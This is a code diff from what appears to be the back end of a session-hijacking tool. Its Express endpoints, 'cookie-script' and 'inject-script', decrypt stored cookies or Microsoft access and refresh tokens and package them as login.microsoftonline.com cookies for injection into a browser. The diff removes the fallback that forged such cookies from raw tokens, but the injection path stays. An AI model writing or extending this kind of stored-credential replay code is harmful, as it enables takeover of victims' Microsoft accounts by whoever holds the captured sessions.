@@ -130,13 +130,6 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     var cookiesList = [];
     if (cookies) {
       cookiesList = parseCookies(cookies);
-    } else {
-      if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
-      }
-      if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
-      }
     }
 
     if (cookiesList.length === 0) {
@@ -592,18 +585,11 @@ router.get('/inject-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available for injection' });
     }
 
-    // Get cookies from token
+    // Get cookies from token - require actual cookies only (no fallback)
     var cookiesList = [];
     var cookiesDecrypted = decrypt(token.cookies_encrypted);
     if (cookiesDecrypted) {
       cookiesList = parseCookies(cookiesDecrypted);
-    } else {
-      if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
-      }
-      if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
-      }
     }
 
     if (cookiesList.length === 0) {
